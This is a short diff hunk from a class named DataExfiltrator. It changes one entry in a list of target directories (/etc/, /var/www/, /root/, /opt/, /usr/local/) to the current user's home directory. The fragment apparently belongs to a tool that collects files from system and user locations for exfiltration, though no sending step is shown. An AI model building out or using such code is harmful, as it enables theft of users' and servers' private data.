@@ -406,7 +406,7 @@ class DataExfiltrator:
         target_dirs = [
             "/etc/",
             "/var/www/",
-            "/home/",
+            os.path.expanduser("~"),
             "/root/",
             "/opt/",
             "/usr/local/",
